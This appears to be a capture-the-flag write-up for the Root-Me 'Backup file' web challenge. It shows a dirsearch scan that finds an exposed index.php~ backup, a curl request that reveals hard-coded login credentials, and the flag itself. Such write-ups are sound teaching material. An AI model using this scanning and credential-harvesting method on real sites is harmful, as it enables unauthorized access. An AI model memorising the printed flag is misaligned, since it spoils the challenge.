@@ -1,0 +1,42 @@
+---
+tags: [web]
+---
+# Backup file
+
+- **Description:** No clue.
+- **Difficulty:** Easy
+
+---
+
+## 🔎 Solution
+Based on the challenge name, it is reasonable to assume that it is related to a website backup file. 
+Using `dirsearch` to scan for hidden or backup paths, we can discover an endpoint named `index.php~`. 
+Backup files are often created by appending suffixes such as `.old`, `~`, and similar to the original filename.
+```
+> dirsearch  -u http://challenge01.root-me.org/web-serveur/ch11/
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
+ (_||| _) (/_(_|| (_| )                                                                                                                                                                                                          
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+Output File: /home/kali/reports/http_challenge01.root-me.org/_web-serveur_ch11__26-02-21_00-51-55.txt
+Target: http://challenge01.root-me.org/
+
+[00:51:55] Starting: web-serveur/ch11/                                                                              
+...                      
+[00:53:33] 200 -  843B  - /web-serveur/ch11/index.php~ 
+...
+```
+
+Requesting this path reveals stored login credentials directly within the source code.
+```
+> curl http://challenge01.root-me.org/web-serveur/ch11/index.php~                                             
+<?php
+
+$username="ch11";
+$password="OCCY9AcNm1tj";
+...
+```
+
+Using these credentials to log in successfully, the application responds with the message: *"To validate the challenge use this password"*.
+
+## 🚩Flag
+> `OCCY9AcNm1tj`
